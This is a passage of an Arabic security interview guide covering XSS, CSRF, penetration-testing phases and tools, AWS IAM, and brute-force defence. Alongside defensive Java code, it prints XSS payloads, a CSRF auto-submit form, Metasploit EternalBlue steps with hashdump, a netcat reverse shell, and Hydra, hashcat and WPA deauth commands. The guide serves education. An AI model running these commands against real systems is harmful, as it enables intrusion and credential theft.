<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

**طرق الحماية:**

**1. Output Encoding/Escaping:**
```java
import org.springframework.web.util.HtmlUtils;

// تنظيف HTML
String safe = HtmlUtils.htmlEscape(userInput);

// في Thymeleaf (Spring Boot)
<span th:text="${userInput}"></span>  <!-- آمن -->
<span th:utext="${userInput}"></span> <!-- غير آمن -->
```

**2. Input Validation:**
```java
import javax.validation.constraints.Pattern;

public class CommentDTO {
    @Pattern(regexp = "^[a-zA-Z0-9\\s.,!?-]*$",
             message = "Invalid characters")
    private String content;
}
```

**3. Content Security Policy (CSP):**
```java
// في Spring Security
http.headers()
    .contentSecurityPolicy("default-src 'self'; script-src 'self' 'nonce-{random}'");
```

**HTTP Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**4. HTTPOnly و Secure Cookies:**
```java
Cookie cookie = new Cookie("sessionId", sessionId);
cookie.setHttpOnly(true);  // لا يمكن الوصول عبر JavaScript
cookie.setSecure(true);    // فقط عبر HTTPS
response.addCookie(cookie);
```

**5. X-XSS-Protection Header:**
```java
http.headers()
    .xssProtection()
    .xssProtectionEnabled(true)
    .block(true);
```

**6. DOM-based Protection:**
```javascript
// ✗ غير آمن
element.innerHTML = userInput;

// ✓ آمن
element.textContent = userInput;

// ✓ أو استخدم مكتبة مثل DOMPurify
var clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

**7. Framework Protection:**
```javascript
// في React
<div>{userInput}</div>  {/* آمن - يُنظف تلقائياً */}

// في Angular
<div>{{userInput}}</div>  {/* آمن - يُنظف تلقائياً */}
```

---

### س20: ما هو CSRF (Cross-Site Request Forgery)؟ وكيف يمكن منعه؟

**الإجابة:**
CSRF هو هجوم يجبر المستخدم المصادق عليه على تنفيذ إجراءات غير مقصودة على تطبيق ويب.

**كيف يعمل:**
```
1. المستخدم مسجل دخوله في bank.com
2. المستخدم يزور موقعاً ضاراً attacker.com
3. الموقع الضار يحتوي على:
   <img src="http://bank.com/transfer?to=attacker&amount=10000">
4. المتصفح يرسل الطلب مع الكوكيز الخاصة بـ bank.com
5. البنك يرى طلباً من مستخدم مصادق عليه، فينفذه!
```

**مثال آخر:**
```html
<!-- في attacker.com -->
<form action="http://bank.com/transfer" method="POST" id="evilForm">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>
    document.getElementById('evilForm').submit();
</script>
```

**طرق الحماية:**

**1. CSRF Tokens (الطريقة الأساسية):**
```java
// في Spring Security - يُفعّل تلقائياً
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf() // مفعّل افتراضياً
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
        return http.build();
    }
}
```

**في HTML Form:**
```html
<form method="POST" action="/transfer">
    <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
    <input type="text" name="to"/>
    <input type="number" name="amount"/>
    <button type="submit">Transfer</button>
</form>
```

**في Thymeleaf:**
```html
<!-- Token يُضاف تلقائياً -->
<form th:action="@{/transfer}" method="post">
    <input type="text" name="to"/>
    <input type="number" name="amount"/>
    <button type="submit">Transfer</button>
</form>
```

**في AJAX:**
```javascript
// الحصول على CSRF token
var token = $("meta[name='_csrf']").attr("content");
var header = $("meta[name='_csrf_header']").attr("content");

// إضافته لجميع طلبات AJAX
$.ajaxSetup({
    beforeSend: function(xhr) {
        xhr.setRequestHeader(header, token);
    }
});
```

**2. SameSite Cookie Attribute:**
```java
Cookie cookie = new Cookie("sessionId", sessionId);
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setAttribute("SameSite", "Strict");  // أو Lax
response.addCookie(cookie);
```

```
SameSite=Strict: الكوكيز لا تُرسل في طلبات cross-site أبداً
SameSite=Lax: الكوكيز تُرسل فقط في طلبات GET من موقع آخر
SameSite=None: يجب استخدامه مع Secure
```

**3. Double Submit Cookie:**
```java
// إرسال CSRF token في الكوكيز والطلب
// التحقق من تطابقهما
public boolean validateCsrfToken(String cookieToken, String requestToken) {
    return cookieToken != null &&
           cookieToken.equals(requestToken);
}
```

**4. Custom Request Headers:**
```javascript
// في SPA/AJAX
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: JSON.stringify(data)
});
```

**5. User Interaction:**
```java
// طلب إعادة المصادقة للعمليات الحساسة
@PostMapping("/transfer")
public String transfer(@RequestParam String to,
                      @RequestParam BigDecimal amount,
                      @RequestParam String password) {
    // التحقق من كلمة المرور قبل التحويل
    if (!passwordEncoder.matches(password, user.getPassword())) {
        throw new BadCredentialsException("Invalid password");
    }
    // إجراء التحويل
}
```

**6. Referer Header Validation:**
```java
@Component
public class RefererCheckFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain chain) {
        String referer = request.getHeader("Referer");

        if (referer == null || !referer.startsWith("https://myapp.com")) {
            response.setStatus(HttpServletResponse.SC_FORBIDDEN);
            return;
        }

        chain.doFilter(request, response);
    }
}
```

**متى لا تحتاج CSRF protection:**
```
✓ APIs بدون session (استخدام JWT في header)
✓ طلبات GET التي لا تعدّل البيانات (idempotent)
```

---

## أسئلة اختبار الاختراق

### س21: ما هي مراحل اختبار الاختراق (Penetration Testing Phases)؟

**الإجابة:**
اختبار الاختراق يمر بـ 5 مراحل رئيسية:

**1. Reconnaissance (الاستطلاع):**
```
الهدف: جمع المعلومات عن الهدف

أ. Passive Reconnaissance (سلبي):
- لا يتفاعل مباشرة مع الهدف
- WHOIS lookup
- DNS enumeration
- Google Dorking
- Social media analysis
- Job postings
- Archive.org

أمثلة:
whois example.com
nslookup example.com
dig example.com ANY

Google Dorks:
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"

ب. Active Reconnaissance (نشط):
- تفاعل مباشر مع الهدف
- Port scanning
- Network mapping
- Service enumeration

أمثلة:
nmap -sn 192.168.1.0/24  # Ping sweep
nmap -p- 192.168.1.1      # Port scan
```

**2. Scanning (المسح):**
```
الهدف: فحص الأنظمة بحثاً عن نقاط الضعف

أ. Port Scanning:
nmap -sV -sC -O -p- 192.168.1.1
# -sV: Version detection
# -sC: Default scripts
# -O: OS detection
# -p-: All ports

ب. Vulnerability Scanning:
nmap --script vuln 192.168.1.1
nikto -h http://example.com
openvas

ج. Network Mapping:
- تحديد الأجهزة النشطة
- رسم خريطة الشبكة
- تحديد العلاقات بين الأنظمة
```

**3. Gaining Access (الوصول):**
```
الهدف: استغلال الثغرات المكتشفة

أ. Exploitation:
- استخدام Metasploit
- كتابة exploits مخصصة
- Password cracking
- SQL Injection
- XSS
- CSRF

ب. Social Engineering:
- Phishing emails
- Pretexting
- Baiting

أمثلة Metasploit:
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.10
exploit
```

**4. Maintaining Access (الحفاظ على الوصول):**
```
الهدف: البقاء في النظام المخترق

أ. Backdoors:
- إنشاء مستخدمين جدد
- تثبيت Remote Access Tools (RATs)
- تعديل خدمات النظام

ب. Rootkits:
- إخفاء الوجود في النظام

ج. Privilege Escalation:
- الحصول على صلاحيات أعلى (root/admin)
```

**5. Covering Tracks (إخفاء الآثار):**
```
الهدف: إزالة الأدلة على الاختراق

أ. حذف Logs:
- System logs
- Application logs
- Web server logs

ب. تعديل Timestamps:
- إخفاء الملفات المضافة

ج. إخفاء الملفات:
- استخدام rootkits
```

**6. Reporting (التقرير):**
```
الهدف: توثيق النتائج وتقديم التوصيات

المحتويات:
✓ Executive Summary
✓ الثغرات المكتشفة
✓ مستوى الخطورة (Critical, High, Medium, Low)
✓ خطوات الاستغلال (Proof of Concept)
✓ التوصيات للإصلاح
✓ الجدول الزمني للإصلاح
```

---

### س22: ما الفرق بين Black Box, White Box, و Gray Box Testing؟

**الإجابة:**

**1. Black Box Testing:**
```
المعرفة: لا توجد معرفة مسبقة بالنظام

المعلومات المتاحة:
- اسم الشركة أو عنوان IP فقط
- لا معرفة بالبنية الداخلية
- لا معرفة بالكود المصدري

المزايا:
✓ يحاكي هجوماً حقيقياً من الخارج
✓ منظور المهاجم الخارجي
✓ يكتشف الثغرات المرئية للعامة

العيوب:
✗ يستغرق وقتاً أطول
✗ قد يفوت ثغرات داخلية
✗ محدود بالسطح الخارجي

مثال:
Tester لديه فقط: www.example.com
يبدأ من الصفر: Reconnaissance → Scanning → Exploitation
```

**2. White Box Testing:**
```
المعرفة: معرفة كاملة بالنظام

المعلومات المتاحة:
- الكود المصدري
- مخططات الشبكة
- بيانات الاعتماد
- الوثائق التقنية
- تفاصيل البنية

المزايا:
✓ فحص شامل ومفصل
✓ يكتشف ثغرات منطق الأعمال
✓ أسرع وأكثر كفاءة
✓ يمكن اختبار كل مسار في الكود

العيوب:
✗ لا يحاكي المهاجم الحقيقي
✗ قد يكون مكلفاً
✗ يتطلب خبرة في قراءة الكود

مثال:
Tester لديه:
- الوصول لـ GitHub repository
- بيانات الاعتماد للنظام
- مخططات قاعدة البيانات
يراجع الكود: Spring Security config, SQL queries, etc.
```

**3. Gray Box Testing:**
```
المعرفة: معرفة جزئية بالنظام

المعلومات المتاحة:
- بعض الوثائق
- حسابات مستخدم عادية (ليست admin)
- معلومات أساسية عن البنية

المزايا:
✓ توازن بين Black و White Box
✓ أكثر واقعية (منظور المستخدم الداخلي)
✓ فعال من حيث التكلفة والوقت
✓ يحاكي هجوم Insider Threat

العيوب:
✗ قد لا يكون شاملاً مثل White Box
✗ قد يفوت بعض الثغرات الخارجية

مثال:
Tester لديه:
- حساب مستخدم عادي
- بعض التوثيق
يحاول: Privilege escalation, Access control bypass
```

**جدول المقارنة:**
```
┌────────────────┬──────────┬──────────┬──────────┐
│                │Black Box │Gray Box  │White Box │
├────────────────┼──────────┼──────────┼──────────┤
│ Knowledge      │   None   │ Partial  │  Full    │
│ Time needed    │   Long   │  Medium  │  Short   │
│ Cost           │   Low    │  Medium  │  High    │
│ Thoroughness   │   Low    │  Medium  │  High    │
│ Realism        │   High   │  Medium  │  Low     │
│ Code access    │   No     │  Maybe   │  Yes     │
└────────────────┴──────────┴──────────┴──────────┘
```

---

### س23: ما هي أدوات Penetration Testing الشائعة؟

**الإجابة:**

**1. Network Scanning:**

**Nmap (Network Mapper):**
```bash
# Basic scan
nmap 192.168.1.1

# Aggressive scan with OS detection
nmap -A 192.168.1.1

# Scan all ports
nmap -p- 192.168.1.1

# Vulnerability scan
nmap --script vuln 192.168.1.1

# Scan a range
nmap 192.168.1.1-254

# Output to file
nmap -oN output.txt 192.168.1.1
```

**Netcat:**
```bash
# Banner grabbing
nc -v 192.168.1.1 80

# Port scanning
nc -zv 192.168.1.1 1-1000

# Reverse shell (attacker)
nc -lvp 4444

# Reverse shell (victim)
nc 192.168.1.5 4444 -e /bin/bash
```

**2. Web Application Testing:**

**Burp Suite:**
```
- Proxy: اعتراض وتعديل الطلبات
- Scanner: فحص الثغرات تلقائياً
- Intruder: هجمات brute force
- Repeater: إعادة إرسال الطلبات
- Decoder: فك الترميز

الاستخدام:
1. إعداد المتصفح ليستخدم Burp كـ proxy
2. اعتراض الطلبات
3. تعديلها واختبار Payloads
```

**OWASP ZAP:**
```
- بديل مفتوح المصدر لـ Burp
- Spider: استكشاف التطبيق
- Active Scan: فحص تلقائي
- Fuzzer: اختبار مدخلات عشوائية
```

**Nikto:**
```bash
# Basic scan
nikto -h http://example.com

# SSL scan
nikto -h https://example.com -ssl

# Tuning (نوع الفحص)
nikto -h http://example.com -Tuning 123

# Output to file
nikto -h http://example.com -o output.html -Format html
```

**3. Exploitation Frameworks:**

**Metasploit:**
```bash
# Start Metasploit
msfconsole

# Search for exploits
search ms17-010
search apache

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOST 192.168.1.10

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5

# Run exploit
exploit

# Meterpreter commands
sysinfo
getuid
hashdump
screenshot
shell
```

**4. Password Cracking:**

**John the Ripper:**
```bash
# Basic cracking
john hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack specific format
john --format=raw-md5 hashes.txt
```

**Hashcat:**
```bash
# Brute force
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a

# Dictionary attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# With rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Hash modes:
# 0 = MD5
# 100 = SHA1
# 1000 = NTLM
# 3200 = bcrypt
```

**Hydra:**
```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.1

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

**5. Wireless Testing:**

**Aircrack-ng:**
```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Capture specific AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (to capture handshake)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA
aircrack-ng -w wordlist.txt capture-01.cap
```

**6. Vulnerability Scanners:**

**OpenVAS:**
```bash
# Start OpenVAS
openvas-start

# Access web interface
http://127.0.0.1:9392

# Create new task
# Select target
# Run scan
# View results
```

**Nessus:**
```
- Commercial vulnerability scanner
- واجهة ويب سهلة الاستخدام
- يكتشف الآلاف من الثغرات
```

**7. Social Engineering:**

**SET (Social Engineering Toolkit):**
```bash
# Start SET
setoolkit

# Common options:
1) Spear-Phishing Attack
2) Website Attack Vectors
3) Infectious Media Generator
4) Create Payload and Listener
```

**8. Forensics & Analysis:**

**Wireshark:**
```
- تحليل حركة الشبكة
- فحص البروتوكولات
- استخراج الملفات من PCAP

Filters:
http
http.request.method == "POST"
ip.addr == 192.168.1.1
tcp.port == 80
```

**9. Enumeration:**

**enum4linux:**
```bash
# Enumerate SMB
enum4linux -a 192.168.1.1
```

**DNSenum:**
```bash
# DNS enumeration
dnsenum example.com
```

**10. Kali Linux:**
```
توزيعة Linux تحتوي على جميع الأدوات السابقة وأكثر
- مخصصة لاختبار الاختراق
- تحتوي على 600+ أداة
- تحديثات منتظمة
```

---

## أسئلة الأمان السحابي

### س24: ما هو نموذج المسؤولية المشتركة (Shared Responsibility Model) في الأمان السحابي؟

**الإجابة:**
نموذج المسؤولية المشتركة يحدد من المسؤول عن تأمين ماذا في البيئة السحابية - مزود الخدمة السحابية أم العميل.

**المبدأ الأساسي:**
```
AWS/Azure/GCP مسؤولة عن: أمان السحابة (Security OF the Cloud)
العميل مسؤول عن: الأمان في السحابة (Security IN the Cloud)
```

**التقسيم حسب نوع الخدمة:**

**1. IaaS (Infrastructure as a Service):**
```
┌─────────────────────────────────────┐
│        Customer Responsibility      │
├─────────────────────────────────────┤
│  Application                        │  ← العميل
│  Data                               │  ← العميل
│  Runtime                            │  ← العميل
│  Middleware                         │  ← العميل
│  Operating System                   │  ← العميل
├─────────────────────────────────────┤
│  Virtualization                     │  ← المزود
│  Servers                            │  ← المزود
│  Storage                            │  ← المزود
│  Networking                         │  ← المزود
│  Data Center                        │  ← المزود
└─────────────────────────────────────┘
      Provider Responsibility

مثال: AWS EC2, Azure VM
- العميل يدير OS, Applications, Data
- AWS تدير البنية التحتية
```

**2. PaaS (Platform as a Service):**
```
┌─────────────────────────────────────┐
│        Customer Responsibility      │
├─────────────────────────────────────┤
│  Application                        │  ← العميل
│  Data                               │  ← العميل
├─────────────────────────────────────┤
│  Runtime                            │  ← المزود
│  Middleware                         │  ← المزود
│  Operating System                   │  ← المزود
│  Virtualization                     │  ← المزود
│  Servers                            │  ← المزود
│  Storage                            │  ← المزود
│  Networking                         │  ← المزود
│  Data Center                        │  ← المزود
└─────────────────────────────────────┘
      Provider Responsibility

مثال: AWS Elastic Beanstalk, Azure App Service
- العميل يدير Application, Data فقط
- المزود يدير Platform والبنية التحتية
```

**3. SaaS (Software as a Service):**
```
┌─────────────────────────────────────┐
│        Customer Responsibility      │
├─────────────────────────────────────┤
│  Data                               │  ← العميل
│  Access Control                     │  ← العميل (جزئياً)
├─────────────────────────────────────┤
│  Application                        │  ← المزود
│  Runtime                            │  ← المزود
│  Middleware                         │  ← المزود
│  Operating System                   │  ← المزود
│  Virtualization                     │  ← المزود
│  Servers                            │  ← المزود
│  Storage                            │  ← المزود
│  Networking                         │  ← المزود
│  Data Center                        │  ← المزود
└─────────────────────────────────────┘
      Provider Responsibility

مثال: Gmail, Office 365, Salesforce
- العميل يدير Data والمستخدمين فقط
- المزود يدير كل شيء آخر
```

**مسؤوليات AWS (مثال):**
```
✓ الأمن المادي لمراكز البيانات
✓ البنية التحتية للشبكة
✓ Hypervisor
✓ البنية التحتية للتخزين
✓ الصيانة والتصحيحات للبنية التحتية
✓ التخلص الآمن من الأجهزة
```

**مسؤوليات العميل:**
```
✓ إدارة الهوية والوصول (IAM)
✓ تشفير البيانات (at rest & in transit)
✓ تكوين Firewall (Security Groups)
✓ تصحيحات نظام التشغيل
✓ النسخ الاحتياطي
✓ Logging & Monitoring
✓ التحكم في الوصول للتطبيقات
✓ حماية بيانات الاعتماد
```

**أمثلة عملية:**

**AWS S3:**
```
AWS مسؤولة عن:
- البنية التحتية لـ S3
- التكرار (Replication)
- المتانة (Durability)

العميل مسؤول عن:
- Bucket policies
- ACLs
- Encryption
- Versioning
- Public access settings
```

**مثال كود - تأمين S3 Bucket:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyInsecureTransport",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
```

---

### س25: ما هي IAM (Identity and Access Management) في AWS؟ وما أفضل الممارسات؟

**الإجابة:**
IAM هي خدمة AWS للتحكم في من يمكنه الوصول لموارد AWS وماذا يمكنه فعله.

**المكونات الأساسية:**

**1. Users (المستخدمون):**
```
- حسابات فردية للأشخاص أو التطبيقات
- لكل user بيانات اعتماد خاصة
- يمكن تعيين permissions مباشرة (غير مستحسن)

مثال:
ahmed@company
sarah@company
app-service-account
```

**2. Groups (المجموعات):**
```
- مجموعة من المستخدمين
- تسهيل إدارة الصلاحيات
- المستخدم يرث صلاحيات المجموعة

مثال:
Developers Group
Admins Group
Data-Scientists Group
```

**3. Roles (الأدوار):**
```
- صلاحيات مؤقتة يمكن لـ entities أخذها
- للخدمات AWS أو حسابات أخرى
- لا يوجد credentials ثابتة

مثال:
EC2-S3-Access-Role
Lambda-Execution-Role
```

**4. Policies (السياسات):**
```
- JSON documents تحدد الصلاحيات
- يمكن ربطها بـ users, groups, roles

أنواع:
- AWS Managed Policies: جاهزة من AWS
- Customer Managed Policies: يكتبها العميل
- Inline Policies: مرتبطة بـ user/group/role واحد
```

**مثال IAM Policy:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-bucket/*"
    },
    {
      "Effect": "Allow",
      "Action": "s3:ListBucket",
      "Resource": "arn:aws:s3:::my-bucket"
    }
  ]
}
```

**Policy Elements:**
```json
{
  "Effect": "Allow" | "Deny",
  "Action": [/* AWS services actions */],
  "Resource": [/* ARNs */],
  "Condition": {/* Optional conditions */}
}
```

**أفضل الممارسات:**

**1. عدم استخدام Root Account:**
```
✗ لا تستخدم root account للأعمال اليومية
✓ أنشئ IAM users للمسؤولين
✓ فعّل MFA على root account
✓ احذف root access keys إن وجدت
```

**2. Principle of Least Privilege:**
```json
// ✗ منح صلاحيات واسعة
{
  "Effect": "Allow",
  "Action": "s3:*",
  "Resource": "*"
}

// ✓ صلاحيات محددة فقط
{
  "Effect": "Allow",
  "Action": [
    "s3:GetObject",
    "s3:PutObject"
  ],
  "Resource": "arn:aws:s3:::specific-bucket/*"
}
```

**3. استخدام Groups:**
```
✗ تعيين permissions لكل user على حدة
✓ إنشاء groups وتعيين users لها

مثال:
Developers → ReadOnlyPolicy
DevOps → AdminPolicy
```

**4. استخدام Roles للتطبيقات:**
```
✗ تضمين Access Keys في الكود
✓ استخدام IAM Roles لـ EC2/Lambda

مثال في EC2:
1. إنشاء IAM Role مع الصلاحيات المطلوبة
2. ربط الـ Role بالـ EC2 instance
3. التطبيق يستخدم الـ Role تلقائياً
```

**5. تفعيل MFA:**
```
✓ لجميع IAM users
✓ خصوصاً للحسابات ذات الصلاحيات العالية
✓ استخدام Virtual MFA أو Hardware MFA
```

**6. تدوير Credentials:**
```
✓ تغيير Access Keys بانتظام
✓ استخدام AWS Config لمراقبة عمر Keys
✓ حذف Keys غير المستخدمة

AWS CLI:
aws iam list-access-keys --user-name ahmed
aws iam create-access-key --user-name ahmed
aws iam delete-access-key --access-key-id OLD_KEY --user-name ahmed
```

**7. استخدام Policy Conditions:**
```json
{
  "Effect": "Allow",
  "Action": "s3:*",
  "Resource": "*",
  "Condition": {
    "IpAddress": {
      "aws:SourceIp": "203.0.113.0/24"
    },
    "DateGreaterThan": {
      "aws:CurrentTime": "2025-01-01T00:00:00Z"
    },
    "DateLessThan": {
      "aws:CurrentTime": "2025-12-31T23:59:59Z"
    }
  }
}
```

**8. Monitoring & Auditing:**
```
✓ تفعيل CloudTrail: لتسجيل جميع API calls
✓ استخدام IAM Access Analyzer
✓ مراجعة IAM Credential Reports
✓ إعداد CloudWatch Alarms

AWS CLI:
aws iam generate-credential-report
aws iam get-credential-report
```

**9. Cross-Account Access:**
```json
// السماح لحساب آخر بالوصول
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

**10. Service Control Policies (SCPs):**
```json
// في AWS Organizations - حماية على مستوى المنظمة
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Action": "ec2:*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "ec2:Region": ["us-east-1", "eu-west-1"]
        }
      }
    }
  ]
}
```

---

## أسئلة متقدمة وسيناريوهات

### س26: لديك تطبيق ويب يتعرض لهجمات brute force. كيف تحمي من ذلك؟

**الإجابة:**
الحماية من Brute Force تتطلب نهجاً متعدد الطبقات:

**1. Rate Limiting (تحديد المعدل):**
```java
// في Spring Boot باستخدام Bucket4j
@Configuration
public class RateLimitConfig {

    @Bean
    public Bucket createBucket() {
        Bandwidth limit = Bandwidth.classic(5, Refill.intervally(5, Duration.ofMinutes(1)));
        return Bucket.builder()
            .addLimit(limit)
            .build();
    }
}

@RestController
public class LoginController {

    @Autowired
    private Bucket bucket;

    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        if (bucket.tryConsume(1)) {
            // Process login
            return authenticate(request);
        } else {
            return ResponseEntity.status(429)
                .body("Too many requests. Please try again later.");
        }
    }
}
```

**2. Account Lockout (قفل الحساب):**
```java
@Service
public class LoginAttemptService {

    private final int MAX_ATTEMPTS = 5;
    private final LoadingCache<String, Integer> attemptsCache;

    public LoginAttemptService() {
        attemptsCache = CacheBuilder.newBuilder()
            .expireAfterWrite(15, TimeUnit.MINUTES)
            .build(new CacheLoader<String, Integer>() {
                public Integer load(String key) {
                    return 0;
                }
            });
    }

    public void loginFailed(String username) {
        int attempts = attemptsCache.getUnchecked(username);
        attemptsCache.put(username, attempts + 1);
    }

    public boolean isBlocked(String username) {
        return attemptsCache.getUnchecked(username) >= MAX_ATTEMPTS;
    }

    public void loginSucceeded(String username) {
        attemptsCache.invalidate(username);
    }
}

@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    if (loginAttemptService.isBlocked(request.getUsername())) {
        return ResponseEntity.status(423)
            .body("Account locked due to too many failed attempts");
    }

    if (authenticate(request)) {
        loginAttemptService.loginSucceeded(request.getUsername());
        return ResponseEntity.ok(token);
    } else {
        loginAttemptService.loginFailed(request.getUsername());
        return ResponseEntity.status(401).body("Invalid credentials");
    }
}
```

**3. CAPTCHA:**
```java
// Google reCAPTCHA v3
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    // Verify reCAPTCHA
    if (!recaptchaService.verify(request.getRecaptchaToken())) {
        return ResponseEntity.status(400).body("CAPTCHA verification failed");
    }

    // Process login
    return authenticate(request);
}

@Service
public class RecaptchaService {

    @Value("${recaptcha.secret}")
    private String secret;

    public boolean verify(String response) {
        String url = "https://www.google.com/recaptcha/api/siteverify";
        Map<String, String> params = new HashMap<>();
        params.put("secret", secret);
        params.put("response", response);

        // Make HTTP POST request
        RecaptchaResponse recaptchaResponse = restTemplate.postForObject(url, params, RecaptchaResponse.class);

        return recaptchaResponse != null &&
               recaptchaResponse.isSuccess() &&
               recaptchaResponse.getScore() > 0.5;
    }
}
```

**4. Progressive Delays (تأخيرات تدريجية):**
```java
@Service
public class LoginDelayService {

    public void addDelay(String username) {
        int attempts = getFailedAttempts(username);

        if (attempts > 0) {
            long delayMs = (long) Math.pow(2, attempts) * 1000; // Exponential backoff
            delayMs = Math.min(delayMs, 60000); // Max 60 seconds

            try {
                Thread.sleep(delayMs);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }
}
```

**5. IP-based Rate Limiting:**
```java
@Component
public class IpRateLimitFilter extends OncePerRequestFilter {

    private final LoadingCache<String, Integer> requestCountsPerIp;

    public IpRateLimitFilter() {
        requestCountsPerIp = CacheBuilder.newBuilder()
            .expireAfterWrite(1, TimeUnit.MINUTES)
            .build(new CacheLoader<String, Integer>() {
                public Integer load(String key) {
                    return 0;
                }
            });
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain chain) throws IOException, ServletException {
        String ip = getClientIP(request);
        int requests = requestCountsPerIp.getUnchecked(ip);

        if (requests >= 100) { // 100 requests per minute
            response.setStatus(429);
            response.getWriter().write("Too many requests from this IP");
            return;
        }

        requestCountsPerIp.put(ip, requests + 1);
        chain.doFilter(request, response);
    }

    private String getClientIP(HttpServletRequest request) {
        String xfHeader = request.getHeader("X-Forwarded-For");
        if (xfHeader == null) {
            return request.getRemoteAddr();
        }
        return xfHeader.split(",")[0];
    }
}
```

**6. Two-Factor Authentication:**
```java
// إجبار 2FA للحسابات الحساسة
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    User user = authenticate(request);

    if (user.isTwoFactorEnabled()) {
        // Send OTP via SMS/Email
        otpService.sendOtp(user);
        return ResponseEntity.ok(new OtpRequiredResponse());
    }

    return ResponseEntity.ok(generateToken(user));
}

@PostMapping("/verify-otp")
public ResponseEntity<?> verifyOtp(@RequestBody OtpRequest request) {
    if (otpService.verify(request.getUsername(), request.getOtp())) {
        User user = userService.findByUsername(request.getUsername());
        return ResponseEntity.ok(generateToken(user));
    }
    return ResponseEntity.status(401).body("Invalid OTP");
}
```

**7. Monitoring & Alerting:**
```java
@Service
public class SecurityMonitoringService {

    @Autowired
    private EmailService emailService;

    public void detectBruteForce(String username, String ip) {
        int failedAttempts = getFailedAttempts(username, ip);

        if (failedAttempts > 10) {
            log.warn("Possible brute force attack - Username: {}, IP: {}, Attempts: {}",
                     username, ip, failedAttempts);

            // Send alert
            emailService.sendSecurityAlert(
                "Brute Force Alert",
                String.format("Detected %d failed login attempts for user %s from IP %s",
                             failedAttempts, username, ip)
            );

            // Optionally block IP at firewall level
            firewallService.blockIp(ip, Duration.ofHours(24));
        }
    }
}
```

**8. Password Complexity Requirements:**
```java
public class PasswordValidator {

    private static final int MIN_LENGTH = 12;
    private static final Pattern UPPERCASE = Pattern.compile("[A-Z]");
    private static final Pattern LOWERCASE = Pattern.compile("[a-z]");
    private static final Pattern DIGIT = Pattern.compile("[0-9]");
    private static final Pattern SPECIAL = Pattern.compile("[!@#$%^&*()_+\\-=\\[\\]{};':\"\\\\|,.<>/?]");

    public static boolean isValid(String password) {
        if (password == null || password.length() < MIN_LENGTH) {
            return false;
        }

        return UPPERCASE.matcher(password).find() &&
               LOWERCASE.matcher(password).find() &&
               DIGIT.matcher(password).find() &&
               SPECIAL.matcher(password).find();
    }
}
```

**9. Notification على تسجيل دخول غير عادي:**
```java
@Service
public class LoginNotificationService {

    public void checkUnusualLogin(User user, String ip, String userAgent) {
        // Check if login from new device/location
        if (isNewDevice(user, userAgent) || isNewLocation(user, ip)) {
            // Send notification
            emailService.send(user.getEmail(),
                "New login detected",
                String.format("We detected a login from a new device/location: %s", ip)
            );
        }
    }
}
```

**10. WAF (Web Application Firewall):**
```
استخدام خدمات مثل:
- Cloudflare
- AWS WAF
- Azure WAF

القواعد:
- Block repeated failed login attempts
- Rate limiting
- Geo-blocking
- IP reputation filtering
```

---

### س27: اكتشفت ثغرة Zero-Day في نظامك. ما هي الخطوات التي ستتخذها؟

**الإجابة:**
التعامل مع ثغرة Zero-Day يتطلب استجابة سريعة ومنهجية:

**المرحلة 1: الاحتواء الفوري (Immediate Containment)**

**1. تقييم سريع:**
```
✓ ما هي الثغرة بالضبط؟
